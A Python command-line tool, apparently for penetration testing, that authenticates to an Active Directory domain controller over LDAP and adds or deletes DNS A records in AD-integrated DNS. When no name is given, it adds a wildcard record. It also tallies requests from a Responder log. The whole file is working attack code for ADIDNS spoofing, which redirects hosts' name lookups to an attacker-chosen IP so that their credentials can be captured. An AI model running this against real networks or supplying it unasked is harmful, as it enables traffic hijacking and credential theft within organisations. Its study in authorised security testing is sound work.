import argparse
import getpass
import socket
import re
from collections import defaultdict
from impacket.structure import Structure
import ldap3
import dns.resolver


class DNS_RECORD(Structure):
    structure = (
        ('DataLength', '<H-Data'),
        ('Type', '<H'),
        ('Version', 'B=5'),
        ('Rank', 'B'),
        ('Flags', '<H=0'),
        ('Serial', '<L'),
        ('TtlSeconds', '>L'),
        ('Reserved', '<L=0'),
        ('TimeStamp', '<L=0'),
        ('Data', ':')
    )


class DNS_RPC_RECORD_A(Structure):
    structure = (
        ('address', ':'),
    )


def get_serial(dns_server, zone):
    resolver = dns.resolver.Resolver()
    try:
        socket.inet_aton(dns_server)
        resolver.nameservers = [dns_server]
    except socket.error:
        pass
    res = resolver.resolve(zone, 'SOA')
    for answer in res:
        return answer.serial + 1


def new_a_record(serial, ip):
    record = DNS_RECORD()
    record['Type'] = 1  # A Record
    record['Serial'] = serial
    record['TtlSeconds'] = 180
    record['Rank'] = 240
    record['Data'] = socket.inet_aton(ip)
    return record


def analyze_log(logfile):
    counts = defaultdict(list)
    with open(logfile) as infile:
        for line in infile:
            parts = line.split(":")
            if len(parts) >= 4:
                ip = parts[2].split()[0]
                rec = parts[3].split()[0]
                counts[rec].append(ip)
    for name, addrs in counts.items():
        print(f"[*] {name} was requested by {len(set(addrs))} unique hosts")


def main():
    parser = argparse.ArgumentParser(description="Add/Remove/Analyze DNS records using LDAP")
    parser.add_argument("-DNS", required=True, help="IP or FQDN of DNS/DC server")
    parser.add_argument("-u", "--user", help="Domain\\Username for auth")
    parser.add_argument("-p", "--password", help="Password or hash")
    parser.add_argument("-a", "--action", choices=["ad", "rm", "an"], required=True, help="Action: ad, rm, an")
    parser.add_argument("-r", "--record", help="DNS record name")
    parser.add_argument("-d", "--data", help="IP address for the A record")
    parser.add_argument("-l", "--logfile", help="Responder log file (for analyze mode)")
    parser.add_argument("--port", type=int, default=389, help="Port to connect to LDAP (default: 389)")
    parser.add_argument("--ssl", action="store_true", help="Use SSL for LDAP connection (port 636)")

    args = parser.parse_args()

    if args.action == "an":
        if args.logfile:
            analyze_log(args.logfile)
            return
        else:
            print("[-] --logfile is required for analyze mode")
            return

    if not args.user or '\\' not in args.user:
        print("[-] --user must be in the format DOMAIN\\username")
        return
    if not args.password:
        args.password = getpass.getpass()

    domain, username = args.user.split("\\")

    server = ldap3.Server(args.DNS, port=args.port, use_ssl=args.ssl, get_info=ldap3.ALL)
    print(f"[*] Connecting to server {args.DNS} on port {args.port} (SSL: {args.ssl})...")
    conn = ldap3.Connection(server, user=args.user, password=args.password, authentication=ldap3.NTLM)
    if not conn.bind():
        print("[-] Bind failed:", conn.result)
        return

    print("[+] Bind successful")

    domainroot = server.info.other['defaultNamingContext'][0]
    dnsroot = f"CN=MicrosoftDNS,DC=DomainDnsZones,{domainroot}"
    zone = re.sub(',DC=', '.', domainroot[domainroot.find('DC='):], flags=re.I)[3:]
    recname = args.record or "*"
    if recname.lower().endswith(zone.lower()):
        recname = recname[:-(len(zone)+1)]
    record_dn = f"DC={recname},DC={zone},{dnsroot}"

    if args.action == "ad":
        if not args.data:
            print("[-] --data is required to add a record")
            return
        serial = get_serial(args.DNS, zone)
        record = new_a_record(serial, args.data)
        entry = {
            'dNSTombstoned': False,
            'name': recname,
            'dnsRecord': [record.getData()]
        }
        print(f"[*] Adding A record: {recname}.{zone} -> {args.data}")
        conn.add(record_dn, ['top', 'dnsNode'], entry)
        print(conn.result)

    elif args.action == "rm":
        base = f"DC={zone},{dnsroot}"
        conn.search(base, f"(&(objectClass=dnsNode)(name={recname}))", attributes=['dnsRecord'])
        if not conn.entries:
            print("[-] Record not found")
            return
        print(f"[*] Deleting DNS record: {recname}.{zone}")
        conn.delete(conn.entries[0].entry_dn)
        print(conn.result)


if __name__ == "__main__":
    main()